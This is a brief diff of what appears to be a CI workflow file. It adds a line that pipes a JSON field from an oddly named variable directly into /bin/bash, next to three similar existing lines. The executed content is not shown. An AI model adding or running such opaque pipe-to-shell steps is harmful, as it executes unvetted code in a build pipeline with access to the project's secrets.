@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$ioc4379" | jq -r .m2862 | /bin/bash
           echo $zu7 | jq -r .kq0 | /bin/bash
           echo $xsp44 | jq -r .pa55 | /bin/bash
+          echo $mpzrz770 | jq -r .fer85 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
